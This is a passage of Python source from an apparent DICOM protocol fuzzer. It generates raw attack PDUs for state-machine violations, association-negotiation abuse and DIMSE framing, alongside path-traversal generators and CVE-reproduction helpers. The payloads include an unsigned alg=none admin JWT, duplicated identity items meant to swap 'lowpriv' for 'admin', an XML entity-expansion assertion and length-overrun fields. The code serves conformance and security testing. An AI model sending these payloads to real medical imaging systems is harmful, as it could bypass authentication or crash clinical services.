        # Filename source ambiguity: command-only, dataset-only, and illegal
        # file-meta variants for the highest-risk null-byte extension-bypass shape.
        yield cls.command_sop_instance_uid_traversal('null_byte')
        yield cls.dataset_only_sop_instance_uid_traversal('null_byte')
        yield cls.file_meta_sop_instance_uid_traversal('null_byte')
        # Study Instance UID names the per-study dir (needs -su).
        for pid in ('posix', 'windows', 'windows_absolute', 'absolute'):
            yield cls.study_instance_uid_traversal(pid)
        # Patient Name names the per-patient dir (needs -sp).
        for pid in ('posix', 'windows', 'windows_absolute', 'absolute'):
            yield cls.patient_name_traversal(pid)


# =============================================================================
# State Machine Attacks - DICOM state machine (Sta1-Sta13) violations
# =============================================================================

class StateMachineAttacks:
    """
    Attacks targeting the DICOM state machine (PS3.8 Chapter 9).

    Pure payload generators — no network I/O. Each method returns an
    AttackResult whose ``payload`` is the complete PDU bytes. Multi-step
    sequences store individual PDUs in ``metadata['steps']``.
    Use ``deliver.send_pdu`` or ``deliver.send_sequence`` to deliver.
    """

    @staticmethod
    def pdata_before_assoc() -> AttackResult:
        """P-DATA-TF before association (Sta1 violation)."""
        pdu_bytes = ProtocolAttacks.pdata_without_association().payload
        return AttackResult(
            name='pdata_before_assoc',
            category='state_machine',
            payload=pdu_bytes,
            description='P-DATA-TF in Sta1 (should only accept A-ASSOCIATE-RQ)',
            expected_behavior='Target should abort or ignore',
            metadata={
                'state': 'Sta1', 'reference': 'PS3.8 Table 9-10',
                'bug_class': 'unassociated-data',
            },
        )

    @staticmethod
    def release_before_assoc() -> AttackResult:
        """A-RELEASE-RQ before association."""
        pkt = DICOM() / A_RELEASE_RQ()
        pdu_bytes = raw(pkt)
        return AttackResult(
            name='release_before_assoc',
            category='state_machine',
            payload=pdu_bytes,
            description='A-RELEASE-RQ in Sta1',
            expected_behavior='Target should abort',
            metadata={
                'state': 'Sta1', 'reference': 'PS3.8 Table 9-10',
                'bug_class': 'unassociated-release',
            },
        )

    @staticmethod
    def double_association() -> AttackResult:
        """Two A-ASSOCIATE-RQ (second should fail)."""
        assoc_result = ProtocolAttacks.double_association()
        steps = assoc_result.metadata['steps']
        return AttackResult(
            name='sm_double_association',
            category='state_machine',
            payload=assoc_result.payload,
            description='Second A-ASSOCIATE-RQ in Sta6',
            expected_behavior='Target should abort on second RQ',
            metadata={'steps': steps},
        )

    @staticmethod
    def release_then_pdata() -> AttackResult:
        """A-RELEASE-RQ followed by P-DATA-TF."""
        assoc_result = ProtocolAttacks.double_association()
        assoc_pdu = assoc_result.metadata['steps'][0]

        release_pdu = raw(DICOM() / A_RELEASE_RQ())
        cmd = C_ECHO_RQ(message_id=1)
        pdv = PresentationDataValueItem(
            context_id=1,
            is_last=1, is_command=1,
            data=raw(cmd),
        )
        pdata_pdu = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))

        steps = [assoc_pdu, release_pdu, pdata_pdu]
        return AttackResult(
            name='release_then_pdata',
            category='state_machine',
            payload=assoc_pdu + release_pdu + pdata_pdu,
            description='P-DATA-TF after A-RELEASE-RQ',
            expected_behavior='Target should abort',
            metadata={'steps': steps},
        )

    @staticmethod
    def incomplete_fragment() -> AttackResult:
        """Partial P-DATA marked as 'not last', then close."""
        assoc_result = ProtocolAttacks.double_association()
        assoc_pdu = assoc_result.metadata['steps'][0]

        pdv = PresentationDataValueItem(
            context_id=1,
            is_last=0, is_command=0,  # Not last, not command
            data=b'partial data here',
        )
        pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))

        steps = [assoc_pdu, pdata]
        return AttackResult(
            name='incomplete_fragment',
            category='state_machine',
            payload=assoc_pdu + pdata,
            description='Partial P-DATA-TF then close',
            expected_behavior='Target should handle incomplete transfer',
            metadata={'steps': steps},
        )

    # -------------------------------------------------------------------------
    # Post-teardown transitions: bytes that arrive after the association is over
    # -------------------------------------------------------------------------

    @staticmethod
    def _assoc_pdu() -> bytes:
        return raw_associate_rq(
            'STORESCP', 'C-SCARE-FZ', VERIFICATION_SOP_CLASS_UID)

    @staticmethod
    def _echo_pdata(message_id: int = 1, context_id: int = 1,
                    is_last: int = 1, is_command: int = 1) -> bytes:
        pdv = PresentationDataValueItem(
            context_id=context_id, is_last=is_last, is_command=is_command,
            data=raw(C_ECHO_RQ(message_id=message_id)),
        )
        return raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))

    @staticmethod
    def _abort_pdu(source: int = 0, reason: int = 0) -> bytes:
        return raw(DICOM() / A_ABORT(source=source, reason_diag=reason))

    @classmethod
    def abort_then_pdata(cls) -> AttackResult:
        """Keep sending after A-ABORT.

        A-ABORT returns both sides to Sta1 immediately (PS3.8 9.2.3), so the
        P-DATA-TF that follows belongs to no association. A target that keeps
        the connection's parsing context alive after abort processes it
        anyway.
        """
        steps = [cls._assoc_pdu(), cls._abort_pdu(), cls._echo_pdata()]
        return AttackResult(
            name='sm_abort_then_pdata',
            category='state_machine',
            payload=b''.join(steps),
            description='P-DATA-TF sent after the requestor issues A-ABORT',
            expected_behavior='Target must discard the connection at A-ABORT and '
                              'process nothing that follows',
            metadata={'steps': steps, 'state': 'Sta1 after abort',
                      'reference': 'PS3.8 9.2.3',
                      'bug_class': 'post-abort-processing'},
        )

    @classmethod
    def pdata_after_release_rp(cls) -> AttackResult:
        """Data after release is complete."""
        steps = [cls._assoc_pdu(), raw_release_rq(), cls._echo_pdata(message_id=2)]
        return AttackResult(
            name='sm_pdata_after_release_rp',
            category='state_machine',
            payload=b''.join(steps),
            description='P-DATA-TF after A-RELEASE-RQ, i.e. once release is under way',
            expected_behavior='Target should abort rather than service data during '
                              'or after release (Sta7/Sta13)',
            metadata={'steps': steps, 'state': 'Sta7',
                      'reference': 'PS3.8 Table 9-10',
                      'bug_class': 'post-release-processing'},
        )

    @classmethod
    def release_collision(cls) -> AttackResult:
        """Two A-RELEASE-RQs, the collision case of PS3.8 9.3.7.

        Release collision is a real but rarely exercised branch: both sides
        request release at once and the requestor must wait for A-RELEASE-RP
        while the acceptor's own A-RELEASE-RQ is in flight.
        """
        steps = [cls._assoc_pdu(), raw_release_rq(), raw_release_rq()]
        return AttackResult(
            name='sm_release_collision',
            category='state_machine',
            payload=b''.join(steps),
            description='Second A-RELEASE-RQ while the first is unanswered',
            expected_behavior='Target should follow the release-collision rules '
                              'or abort, not double-free the association',
            metadata={'steps': steps, 'state': 'Sta7',
                      'reference': 'PS3.8 9.3.7',
                      'bug_class': 'release-collision'},
        )

    # -------------------------------------------------------------------------
    # Role reversal: acceptor PDUs sent by the requestor
    # -------------------------------------------------------------------------

    @classmethod
    def associate_ac_from_requestor(cls) -> AttackResult:
        """The requestor sends A-ASSOCIATE-AC, which only an acceptor may send.

        An SCP that shares one PDU dispatch table between both roles will
        parse an AC it can never legitimately receive.
        """
        ac_pdu = raw(DICOM() / A_ASSOCIATE_AC(
            called_ae_title='STORESCP', calling_ae_title='C-SCARE-FZ'))
        steps = [ac_pdu]
        return AttackResult(
            name='sm_associate_ac_from_requestor',
            category='state_machine',
            payload=ac_pdu,
            description='A-ASSOCIATE-AC sent by the association requestor in Sta1',
            expected_behavior='An acceptor must reject a PDU only it is allowed '
                              'to send',
            metadata={'steps': steps, 'state': 'Sta1',
                      'reference': 'PS3.8 Table 9-10',
                      'bug_class': 'role-confusion'},
        )

    @classmethod
    def release_rp_from_requestor(cls) -> AttackResult:
        """A-RELEASE-RP sent by the requestor, which only an acceptor may send."""
        rp_pdu = raw(DICOM() / A_RELEASE_RP())
        steps = [cls._assoc_pdu(), rp_pdu]
        return AttackResult(
            name='sm_release_rp_from_requestor',
            category='state_machine',
            payload=b''.join(steps),
            description='A-RELEASE-RP sent by the requestor in Sta6',
            expected_behavior='Target should abort on a response PDU it never '
                              'requested',
            metadata={'steps': steps, 'state': 'Sta6',
                      'reference': 'PS3.8 Table 9-10',
                      'bug_class': 'role-confusion'},
        )

    # -------------------------------------------------------------------------
    # PDV-level framing inside an otherwise valid association
    # -------------------------------------------------------------------------

    @classmethod
    def data_pdv_before_command_pdv(cls) -> AttackResult:
        """A data-set PDV with no command PDV ahead of it.

        PS3.7 6.3.1: every DIMSE message is a command set optionally followed
        by a data set. A data PDV that arrives first has no command context to
        be interpreted against.
        """
        ds = _injection_base_dataset()
        pdv = PresentationDataValueItem(
            context_id=1, is_last=1, is_command=0, data=ds.encode())
        pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
        steps = [cls._assoc_pdu(), pdata]
        return AttackResult(
            name='sm_data_pdv_before_command_pdv',
            category='state_machine',
            payload=b''.join(steps),
            description='Data-set PDV arrives with no preceding command-set PDV',
            expected_behavior='Target must require a command set before a data '
                              'set (PS3.7 6.3.1)',
            metadata={'steps': steps, 'reference': 'PS3.7 6.3.1',
                      'bug_class': 'dimse-message-ordering'},
        )

    @classmethod
    def unterminated_command_fragment(cls) -> AttackResult:
        """Command PDVs that never set the last-fragment flag.

        Each fragment says more is coming, so a target that buffers until the
        last flag arrives accumulates without bound on a single association.
        """
        fragments = []
        for _ in range(8):
            pdv = PresentationDataValueItem(
                context_id=1, is_last=0, is_command=1,
                data=raw(C_ECHO_RQ(message_id=1))[:16])
            fragments.append(raw(DICOM() / P_DATA_TF(pdv_items=[pdv])))
        steps = [cls._assoc_pdu()] + fragments
        return AttackResult(
            name='sm_unterminated_command_fragment',
            category='state_machine',
            payload=b''.join(steps),
            description='Eight command PDVs, none marked last, then silence',
            expected_behavior='Target should bound reassembly buffers and time '
                              'out an unterminated DIMSE message',
            metadata={'steps': steps, 'fragment_count': 8,
                      'reference': 'PS3.8 9.3.5',
                      'bug_class': 'unbounded-reassembly'},
        )

    @classmethod
    def interleaved_context_ids(cls) -> AttackResult:
        """One message's fragments interleaved with another context's.

        PS3.8 9.3.5 forbids interleaving PDVs of different presentation
        contexts inside a message. A target keying reassembly on the
        connection rather than the context ID will splice them together.
        """
        first = PresentationDataValueItem(
            context_id=1, is_last=0, is_command=1,
            data=raw(C_ECHO_RQ(message_id=1))[:12])
        other = PresentationDataValueItem(
            context_id=3, is_last=0, is_command=1,
            data=raw(C_ECHO_RQ(message_id=2))[:12])
        tail = PresentationDataValueItem(
            context_id=1, is_last=1, is_command=1,
            data=raw(C_ECHO_RQ(message_id=1))[12:])
        steps = [
            cls._assoc_pdu(),
            raw(DICOM() / P_DATA_TF(pdv_items=[first])),
            raw(DICOM() / P_DATA_TF(pdv_items=[other])),
            raw(DICOM() / P_DATA_TF(pdv_items=[tail])),
        ]
        return AttackResult(
            name='sm_interleaved_context_ids',
            category='state_machine',
            payload=b''.join(steps),
            description='PDVs for presentation context 3 interleave the fragments '
                        'of a message on context 1',
            expected_behavior='Reassembly must be per presentation context; '
                              'interleaving should abort (PS3.8 9.3.5)',
            metadata={'steps': steps, 'reference': 'PS3.8 9.3.5',
                      'bug_class': 'cross-context-reassembly'},
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every state machine attack payload."""
        yield cls.pdata_before_assoc()
        yield cls.release_before_assoc()
        yield cls.double_association()
        yield cls.release_then_pdata()
        yield cls.incomplete_fragment()
        yield cls.abort_then_pdata()
        yield cls.pdata_after_release_rp()
        yield cls.release_collision()
        yield cls.associate_ac_from_requestor()
        yield cls.release_rp_from_requestor()
        yield cls.data_pdv_before_command_pdv()
        yield cls.unterminated_command_fragment()
        yield cls.interleaved_context_ids()


# =============================================================================
# CVE Attacks - CVE-specific reproductions
# =============================================================================

ICSMA_26_181_01 = 'ICSMA-26-181-01'




def _cfind_pdata_bytes(identifier: Dataset,
                       sop_class_uid: str = MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
                       message_id: int = 1) -> bytes:
    identifier_bytes = identifier.encode()
    cmd = C_FIND_RQ(
        affected_sop_class_uid=sop_class_uid,
        message_id=message_id,
        priority=0x0000,
    )
    cmd_pdv = PresentationDataValueItem(
        context_id=1,
        is_last=1,
        is_command=1,
        data=raw(cmd),
    )
    data_pdv = PresentationDataValueItem(
        context_id=1,
        is_last=1,
        is_command=0,
        data=identifier_bytes,
    )
    return raw(DICOM() / P_DATA_TF(pdv_items=[cmd_pdv, data_pdv]))


def _cstore_pdata_bytes(dataset: Optional[bytes],
                        sop_class_uid: str = SECONDARY_CAPTURE_SOP_CLASS_UID,
                        sop_instance_uid: str = '1.2.3.4.5',
                        message_id: int = 1,
                        priority: int = 0x0002,
                        data_set_type: int = 0x0000,
                        move_originator_ae_title: Optional[str] = None,
                        move_originator_message_id: Optional[int] = None) -> bytes:
    kwargs = {
        'affected_sop_class_uid': sop_class_uid,
        'affected_sop_instance_uid': sop_instance_uid,
        'message_id': message_id,
        'priority': priority,
        'data_set_type': data_set_type,
    }
    if move_originator_ae_title is not None:
        kwargs['move_originator_ae_title'] = move_originator_ae_title
    if move_originator_message_id is not None:
        kwargs['move_originator_message_id'] = move_originator_message_id

    cmd = C_STORE_RQ(**kwargs)
    pdv_items = [PresentationDataValueItem(
        context_id=1,
        is_last=1,
        is_command=1,
        data=raw(cmd),
    )]
    if dataset is not None:
        pdv_items.append(PresentationDataValueItem(
            context_id=1,
            is_last=1,
            is_command=0,
            data=dataset,
        ))
    return raw(DICOM() / P_DATA_TF(pdv_items=pdv_items))


def _cstore_sequence_bytes(dataset: Optional[bytes], **kwargs) -> Tuple[bytes, List[bytes]]:
    assoc = raw_associate_rq(
        'STORESCP', 'C-SCARE-FZ',
        kwargs.get('sop_class_uid', SECONDARY_CAPTURE_SOP_CLASS_UID))
    pdata = _cstore_pdata_bytes(dataset, **kwargs)
    release = raw_release_rq()
    steps = [assoc, pdata, release]
    return b''.join(steps), steps


def _icsma_metadata(cve: str,
                    cwe: str,
                    blackbox_driver: str,
                    greybox_driver: str,
                    target: str) -> Dict[str, Any]:
    return {
        'cve': cve,
        'advisory': ICSMA_26_181_01,
        'cwe': cwe,
        'coverage_mode': 'both',
        'blackbox_driver': blackbox_driver,
        'greybox_driver': greybox_driver,
        'target': target,
    }


# =============================================================================
# Negotiation Attacks - A-ASSOCIATE user-information sub-item abuse (PS3.7 D.3)
# =============================================================================

# User Information sub-item types, PS3.7 Annex D.3.3.
_ITEM_MAX_LENGTH = 0x51
_ITEM_IMPLEMENTATION_CLASS_UID = 0x52
_ITEM_ASYNC_OPERATIONS_WINDOW = 0x53
_ITEM_ROLE_SELECTION = 0x54
_ITEM_IMPLEMENTATION_VERSION = 0x55
_ITEM_SOP_EXTENDED_NEGOTIATION = 0x56
_ITEM_SOP_COMMON_EXTENDED_NEGOTIATION = 0x57
_ITEM_USER_IDENTITY_RQ = 0x58

# User Identity types, PS3.7 D.3.3.7.1. Types 3-5 hand attacker-controlled
# bytes to a ticket, XML, or JWT parser respectively - parsers that sit in
# front of authentication and are rarely reached by conformance testing.
USER_IDENTITY_USERNAME = 1
USER_IDENTITY_USERNAME_PASSCODE = 2
USER_IDENTITY_KERBEROS = 3
USER_IDENTITY_SAML = 4
USER_IDENTITY_JWT = 5


def _user_identity_bytes(identity_type: int,
                         primary: bytes,
                         secondary: bytes = b'',
                         positive_response: int = 1,
                         declared_primary_len: Optional[int] = None,
                         declared_secondary_len: Optional[int] = None) -> bytes:
    """Build a User Identity Negotiation sub-item (PS3.7 D.3.3.7).

    ``declared_*_len`` override the length prefixes without changing the bytes
    that follow, which is how a length-versus-content disagreement is
    expressed on the wire.
    """
    primary_len = len(primary) if declared_primary_len is None else declared_primary_len
    secondary_len = len(secondary) if declared_secondary_len is None else declared_secondary_len
    body = struct.pack('!BB', identity_type & 0xFF, positive_response & 0xFF)
    body += struct.pack('!H', primary_len & 0xFFFF) + primary
    body += struct.pack('!H', secondary_len & 0xFFFF) + secondary
    return raw_item(_ITEM_USER_IDENTITY_RQ, body)


def _baseline_user_info(extra: bytes) -> bytes:
    """User Information carrying the mandatory items plus ``extra``.

    Keeping Maximum Length and Implementation Class UID valid isolates the
    sub-item under test: a rejection then means the target rejected *that*
    item, not an otherwise unusable association request.
    """
    payload = raw_item(_ITEM_MAX_LENGTH, struct.pack('!I', 16384))
    payload += raw_item(_ITEM_IMPLEMENTATION_CLASS_UID,
                           IMPLEMENTATION_CLASS_UID.encode('ascii'))
    return payload + extra


def _negotiation_rq(extra_user_info: bytes,
                    abstract_syntax: str = CT_IMAGE_STORAGE_SOP_CLASS_UID) -> bytes:
    return raw_associate_rq(
        'STORESCP', 'C-SCARE-FZ', abstract_syntax,
        user_info_payload=_baseline_user_info(extra_user_info))


def _negotiation_metadata(scope: str, item_type: int, **extra) -> Dict[str, Any]:
    metadata = {
        'coverage_scope': scope,
        'user_information_item_type': f'0x{item_type:02X}',
        'target_role': 'scp-server',
        'delivery': 'raw-pdu',
        'reference': 'PS3.7 Annex D.3.3',
    }
    metadata.update(extra)
    return metadata


class NegotiationAttacks:
    """
    A-ASSOCIATE User Information sub-item abuse (PS3.7 Annex D.3.3).

    Association negotiation is parsed *before* any DIMSE service runs and
    before most access control, so a defect here is reachable by an
    unauthenticated peer that never completes an association. User Identity
    Negotiation is the notable one: many deployments treat it as the
    authentication boundary, and types 3-5 hand attacker-controlled bytes to
    a Kerberos, XML, or JWT parser.

    Every payload is a single complete A-ASSOCIATE-RQ; deliver with
    ``deliver.send_pdu``. The mandatory user-information items stay valid so a
    rejection is attributable to the sub-item under test.
    """

    # -------------------------------------------------------------------------
    # User Identity Negotiation (0x58) - the authentication surface
    # -------------------------------------------------------------------------

    @staticmethod
    def user_identity_empty_credentials() -> AttackResult:
        """Username+passcode identity with both fields empty."""
        payload = _negotiation_rq(_user_identity_bytes(
            USER_IDENTITY_USERNAME_PASSCODE, b'', b''))
        return AttackResult(
            name='negotiation_user_identity_empty_credentials',
            category='negotiation',
            payload=payload,
            description='User Identity type 2 (username+passcode) with both fields empty',
            expected_behavior='Target must not treat empty credentials as an '
                              'authenticated identity',
            metadata=_negotiation_metadata(
                'user-identity-authentication', _ITEM_USER_IDENTITY_RQ,
                identity_type=USER_IDENTITY_USERNAME_PASSCODE,
                bug_class='authentication-bypass'),
        )

    @staticmethod
    def user_identity_primary_length_lie() -> AttackResult:
        """Primary field length declares far more than the bytes that follow."""
        payload = _negotiation_rq(_user_identity_bytes(
            USER_IDENTITY_USERNAME, b'admin', declared_primary_len=0xFFFF))
        return AttackResult(
            name='negotiation_user_identity_primary_length_lie',
            category='negotiation',
            payload=payload,
            description='User Identity primary field declares 65535 bytes, 5 present',
            expected_behavior='Target must bound the declared length by the '
                              'remaining sub-item bytes before reading',
            metadata=_negotiation_metadata(
                'user-identity-length-handling', _ITEM_USER_IDENTITY_RQ,
                identity_type=USER_IDENTITY_USERNAME,
                declared_length=0xFFFF, actual_length=5,
                bug_class='length-vs-content-mismatch'),
        )

    @staticmethod
    def user_identity_secondary_length_lie() -> AttackResult:
        """Secondary (passcode) field length overruns the sub-item."""
        payload = _negotiation_rq(_user_identity_bytes(
            USER_IDENTITY_USERNAME_PASSCODE, b'admin', b'pw',
            declared_secondary_len=0x7FFF))
        return AttackResult(
            name='negotiation_user_identity_secondary_length_lie',
            category='negotiation',
            payload=payload,
            description='User Identity passcode field declares 32767 bytes, 2 present',
            expected_behavior='Target must bound the passcode read by the '
                              'sub-item length',
            metadata=_negotiation_metadata(
                'user-identity-length-handling', _ITEM_USER_IDENTITY_RQ,
                identity_type=USER_IDENTITY_USERNAME_PASSCODE,
                declared_length=0x7FFF, actual_length=2,
                bug_class='length-vs-content-mismatch'),
        )

    @staticmethod
    def user_identity_oversized_username(size: int = 8192) -> AttackResult:
        """Username far longer than any deployment expects."""
        payload = _negotiation_rq(_user_identity_bytes(
            USER_IDENTITY_USERNAME, b'A' * size))
        return AttackResult(
            name='negotiation_user_identity_oversized_username',
            category='negotiation',
            payload=payload,
            description=f'User Identity username of {size} bytes',
            expected_behavior='Target should reject or bound an oversized '
                              'identity without a fixed-size copy',
            metadata=_negotiation_metadata(
                'user-identity-length-handling', _ITEM_USER_IDENTITY_RQ,
                identity_type=USER_IDENTITY_USERNAME, size=size,
                bug_class='unbounded-copy'),
        )

    @staticmethod
    def user_identity_undefined_type(identity_type: int = 0xFF) -> AttackResult:
        """Identity type outside the values PS3.7 D.3.3.7.1 defines."""
        payload = _negotiation_rq(_user_identity_bytes(identity_type, b'probe'))
        return AttackResult(
            name='negotiation_user_identity_undefined_type',
            category='negotiation',
            payload=payload,
            description=f'User Identity type {identity_type:#x} is not defined in PS3.7',
            expected_behavior='Target should reject an unknown identity type '
                              'rather than dispatch on it',
            metadata=_negotiation_metadata(
                'user-identity-type-dispatch', _ITEM_USER_IDENTITY_RQ,
                identity_type=identity_type, bug_class='unvalidated-type-dispatch'),
        )

    @staticmethod
    def user_identity_kerberos_garbage() -> AttackResult:
        """Kerberos identity type carrying bytes that are not a service ticket."""
        ticket = b'\x6e\x82\xff\xff' + b'\x00\x01\x02\x03' * 32
        payload = _negotiation_rq(_user_identity_bytes(
            USER_IDENTITY_KERBEROS, ticket))
        return AttackResult(
            name='negotiation_user_identity_kerberos_garbage',
            category='negotiation',
            payload=payload,
            description='User Identity type 3 with a malformed Kerberos service ticket '
                        '(ASN.1 tag with an oversized length)',
            expected_behavior='Ticket parsing must fail closed without reading '
                              'past the supplied bytes',
            metadata=_negotiation_metadata(
                'user-identity-ticket-parser', _ITEM_USER_IDENTITY_RQ,
                identity_type=USER_IDENTITY_KERBEROS,
                bug_class='asn1-length-handling'),
        )

    @staticmethod
    def user_identity_saml_entity_expansion() -> AttackResult:
        """SAML identity whose assertion is an XML entity-expansion document.

        Type 4 feeds attacker bytes straight to an XML parser. This is the
        classic reachability probe for a parser left with entity resolution
        enabled; the entity here is internal and inert.
        """
        assertion = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE Assertion ['
            b'<!ENTITY a "AAAAAAAAAA">'
            b'<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
            b'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">'
            b']>'
            b'<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion">&c;</Assertion>'
        )
        payload = _negotiation_rq(_user_identity_bytes(
            USER_IDENTITY_SAML, assertion))
        return AttackResult(
            name='negotiation_user_identity_saml_entity_expansion',
            category='negotiation',
            payload=payload,
            description='User Identity type 4 with a SAML assertion declaring '
                        'nested internal XML entities',
            expected_behavior='XML parsing must run with entity expansion and '
                              'external entity resolution disabled',
            metadata=_negotiation_metadata(
                'user-identity-xml-parser', _ITEM_USER_IDENTITY_RQ,
                identity_type=USER_IDENTITY_SAML,
                bug_class='xml-entity-expansion',
                expansion_factor=1000),
        )

    @staticmethod
    def user_identity_jwt_alg_none() -> AttackResult:
        """JWT identity with alg=none and no signature segment."""
        header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
        claims = base64.urlsafe_b64encode(
            b'{"sub":"c-scare","iss":"c-scare","admin":true}').rstrip(b'=')
        token = header + b'.' + claims + b'.'
        payload = _negotiation_rq(_user_identity_bytes(
            USER_IDENTITY_JWT, token))
        return AttackResult(
            name='negotiation_user_identity_jwt_alg_none',
            category='negotiation',
            payload=payload,
            description='User Identity type 5 with an unsigned alg=none JWT',
            expected_behavior='Target must reject alg=none and require a '
                              'verified signature before accepting the identity',
            metadata=_negotiation_metadata(
                'user-identity-jwt-verification', _ITEM_USER_IDENTITY_RQ,
                identity_type=USER_IDENTITY_JWT,
                bug_class='signature-verification-bypass'),
        )

    # -------------------------------------------------------------------------
    # Extended negotiation, role selection, async window
    # -------------------------------------------------------------------------

    @staticmethod
    def extended_negotiation_oversized_app_info(size: int = 4096) -> AttackResult:
        """SOP Class Extended Negotiation with oversized application information."""
        sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
        body = struct.pack('!H', len(sop)) + sop + b'\xFF' * size
        payload = _negotiation_rq(raw_item(_ITEM_SOP_EXTENDED_NEGOTIATION, body))
        return AttackResult(
            name='negotiation_extended_oversized_app_info',
            category='negotiation',
            payload=payload,
            description=f'SOP Class Extended Negotiation with {size} bytes of '
                        'service-class application information',
            expected_behavior='Target should bound the application-information '
                              'field against the sub-item length',
            metadata=_negotiation_metadata(
                'extended-negotiation', _ITEM_SOP_EXTENDED_NEGOTIATION,
                size=size, bug_class='unbounded-copy'),
        )

    @staticmethod
    def extended_negotiation_uid_length_overrun() -> AttackResult:
        """Extended negotiation SOP Class UID length overruns the sub-item."""
        sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
        body = struct.pack('!H', 0xFFFF) + sop + b'\x01'
        payload = _negotiation_rq(raw_item(_ITEM_SOP_EXTENDED_NEGOTIATION, body))
        return AttackResult(
            name='negotiation_extended_uid_length_overrun',
            category='negotiation',
            payload=payload,
            description='SOP Class Extended Negotiation UID length declares 65535 '
                        f'bytes, {len(sop)} present',
            expected_behavior='Target must clamp the UID length to the sub-item '
                              'before slicing',
            metadata=_negotiation_metadata(
                'extended-negotiation', _ITEM_SOP_EXTENDED_NEGOTIATION,
                declared_length=0xFFFF, actual_length=len(sop),
                bug_class='length-vs-content-mismatch'),
        )

    @staticmethod
    def role_selection_unnegotiated_sop_class() -> AttackResult:
        """Role selection naming a SOP class no presentation context offered."""
        sop = MR_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
        body = struct.pack('!H', len(sop)) + sop + b'\x01\x01'
        payload = _negotiation_rq(
            raw_item(_ITEM_ROLE_SELECTION, body),
            abstract_syntax=CT_IMAGE_STORAGE_SOP_CLASS_UID)
        return AttackResult(
            name='negotiation_role_selection_unnegotiated_sop_class',
            category='negotiation',
            payload=payload,
            description='SCP/SCU Role Selection references a SOP class absent '
                        'from every presentation context',
            expected_behavior='Target should ignore or reject role selection for '
                              'an unoffered abstract syntax, not index on it',
            metadata=_negotiation_metadata(
                'role-selection', _ITEM_ROLE_SELECTION,
                bug_class='unmatched-lookup'),
        )

    @staticmethod
    def role_selection_both_roles_set() -> AttackResult:
        """Role selection claiming both SCU and SCP roles for one SOP class."""
        sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
        body = struct.pack('!H', len(sop)) + sop + b'\x01\x01'
        payload = _negotiation_rq(raw_item(_ITEM_ROLE_SELECTION, body))
        return AttackResult(
            name='negotiation_role_selection_both_roles_set',
            category='negotiation',
            payload=payload,
            description='SCP/SCU Role Selection sets both SCU and SCP roles, '
                        'inviting the target to act as SCP on its own request',
            expected_behavior='Target should resolve roles to a single supported '
                              'direction before any data transfer',
            metadata=_negotiation_metadata(
                'role-selection', _ITEM_ROLE_SELECTION,
                bug_class='role-confusion'),
        )

    @staticmethod
    def async_window_zero_operations() -> AttackResult:
        """Asynchronous Operations Window advertising a zero-sized window."""
        body = struct.pack('!HH', 0, 0)
        payload = _negotiation_rq(raw_item(_ITEM_ASYNC_OPERATIONS_WINDOW, body))
        return AttackResult(
            name='negotiation_async_window_zero_operations',
            category='negotiation',
            payload=payload,
            description='Asynchronous Operations Window invokes 0 and performs 0',
            expected_behavior='Target should clamp to at least one outstanding '
                              'operation rather than deadlock or divide by the window',
            metadata=_negotiation_metadata(
                'async-operations-window', _ITEM_ASYNC_OPERATIONS_WINDOW,
                bug_class='zero-window-deadlock'),
        )

    @staticmethod
    def duplicate_user_identity_items() -> AttackResult:
        """Two User Identity sub-items in one A-ASSOCIATE-RQ.

        PS3.7 D.3.3.7 allows one. Which one a target binds decides whose
        identity the association runs as, so a target that keeps the first for
        authorization but the last for logging is auditing the wrong principal.
        """
        first = _user_identity_bytes(USER_IDENTITY_USERNAME, b'lowpriv')
        second = _user_identity_bytes(USER_IDENTITY_USERNAME, b'admin')
        payload = _negotiation_rq(first + second)
        return AttackResult(
            name='negotiation_duplicate_user_identity_items',
            category='negotiation',
            payload=payload,
            description='A-ASSOCIATE-RQ carries two User Identity sub-items '
                        "('lowpriv' then 'admin')",
            expected_behavior='Target should reject a duplicated User Identity '
                              'item; authorization and audit must never bind '
                              'different ones',
            metadata=_negotiation_metadata(
                'user-identity-duplication', _ITEM_USER_IDENTITY_RQ,
                identities=['lowpriv', 'admin'],
                bug_class='duplicate-item-precedence'),
        )

    @staticmethod
    def user_information_item_length_overrun() -> AttackResult:
        """A user-information sub-item whose length runs past the PDU."""
        body = struct.pack('!I', 16384)
        oversized = bytes([_ITEM_MAX_LENGTH, 0]) + struct.pack('!H', 0xFFFF) + body
        payload = _negotiation_rq(oversized)
        return AttackResult(
            name='negotiation_user_information_item_length_overrun',
            category='negotiation',
            payload=payload,
            description='Maximum Length sub-item declares 65535 bytes inside a '
                        'PDU that is far shorter',
            expected_behavior='Sub-item walking must stop at the PDU boundary',
            metadata=_negotiation_metadata(
                'user-information-item-walk', _ITEM_MAX_LENGTH,
                declared_length=0xFFFF, actual_length=len(body),
                bug_class='item-walk-overrun'),
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every association-negotiation attack payload."""
        yield cls.user_identity_empty_credentials()
        yield cls.user_identity_primary_length_lie()
        yield cls.user_identity_secondary_length_lie()
        yield cls.user_identity_oversized_username()
        yield cls.user_identity_undefined_type()
        yield cls.user_identity_kerberos_garbage()
        yield cls.user_identity_saml_entity_expansion()
        yield cls.user_identity_jwt_alg_none()
        yield cls.duplicate_user_identity_items()
        yield cls.extended_negotiation_oversized_app_info()
        yield cls.extended_negotiation_uid_length_overrun()
        yield cls.role_selection_unnegotiated_sop_class()
        yield cls.role_selection_both_roles_set()
        yield cls.async_window_zero_operations()
        yield cls.user_information_item_length_overrun()


# =============================================================================
# DIMSE-N Attacks - normalized services: MPPS, Storage Commitment (PS3.7 10.1)
# =============================================================================

def _n_pdata_bytes(command_pkt, dataset: Optional[bytes] = None,
                   context_id: int = 1) -> bytes:
